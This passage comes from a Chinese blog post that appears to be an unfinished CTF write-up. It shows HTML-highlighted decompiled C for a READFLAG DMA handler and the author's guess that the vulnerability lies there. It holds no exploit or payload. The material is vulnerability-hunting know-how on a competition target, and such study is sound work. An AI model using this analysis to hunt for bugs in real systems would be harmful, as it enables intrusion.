style="color:#B56959">READFLAG: clamping DMA </span><span style="color:#A65E2B">%#.16lx</span><span style="color:#B56959"> to </span><span style="color:#A65E2B">%#.16lx</span><span style="color:#B56959">!</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> v13</span><span style="color:#999999">,</span><span style="color:#393A34"> v13 </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> *</span><span style="color:#bda437">(</span><span style="color:#393A34">a1 </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 7184</span><span style="color:#bda437">)</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#59873A">      _mm_mfence</span><span style="color:#a13865">(</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">      v15 </span><span style="color:#999999">=</span><span style="color:#393A34"> a1 </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 568</span><span style="color:#999999">;</span><br><span style="color:#393A34">      v16 </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><span style="color:#AB5959">LL</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#a65e2b">}</span><br><span style="color:#59873A">    copy</span><span style="color:#a65e2b">(</span><span style="color:#393A34">v15</span><span style="color:#999999">,</span><span style="color:#393A34"> v14</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1</span><span style="color:#AB5959">LL</span><span style="color:#999999">,</span><span style="color:#393A34"> v12</span><span style="color:#999999">,</span><span style="color:#393A34"> len</span><span style="color:#999999">,</span><span style="color:#393A34"> v16</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#393A34">    flag </span><span style="color:#999999">=</span><span style="color:#AB5959"> *</span><span style="color:#a65e2b">(</span><span style="color:#393A34">a1 </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 3032</span><span style="color:#a65e2b">)</span><span style="color:#999999">;</span><br><span style="color:#AB5959">    *</span><span style="color:#a65e2b">(</span><span style="color:#393A34">a1 </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 3032</span><span style="color:#a65e2b">)</span><span style="color:#999999"> =</span><span style="color:#393A34"> flag </span><span style="color:#AB5959">&#x26;</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">FFFFFFFFFFFFFFFE</span><span style="color:#AB5959">LL</span><span style="color:#999999">;</span><br><span style="color:#1E754F">    if</span><span style="color:#999999"> </span><span style="color:#a65e2b">(</span><span style="color:#999999"> </span><span style="color:#a13865">(</span><span style="color:#393A34">flag </span><span style="color:#AB5959">&#x26;</span><span style="color:#2F798A"> 4</span><span style="color:#a13865">)</span><span style="color:#AB5959"> !=</span><span style="color:#2F798A"> 0</span><span style="color:#999999"> </span><span style="color:#a65e2b">)</span><br><span style="color:#999999">    </span><span style="color:#a65e2b">{</span><br><span style="color:#AB5959">      *</span><span style="color:#a13865">(</span><span style="color:#393A34">a1 </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 3000</span><span style="color:#a13865">)</span><span style="color:#AB5959"> |=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">100</span><span style="color:#AB5959">u</span><span style="color:#999999">;</span><br><span style="color:#1E754F">      return</span><span style="color:#59873A"> sub_3D6DF0</span><span style="color:#a13865">(</span><span style="color:#393A34">a1</span><span style="color:#a13865">)</span><span style="color:#999999">;</span><br><span style="color:#999999">    </span><span style="color:#a65e2b">}</span><br><span style="color:#999999">  </span><span style="color:#1e754f">}</span><br><span style="color:#1E754F">  return</span><span style="color:#393A34"> flag</span><span style="color:#999999">;</span><br><span style="color:#2993a3">}</span><br></code></pre></div>
<p>到这感觉洞应该就是在这里了，后来出题人也上了 hint，但是看不太明白，，，这个题最后也没做出来。</p></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">保持联系</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>本站基于
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
改造，除特别说明外内容以 CC BY 4.0 协议共享。</p></span></div></footer></body></html>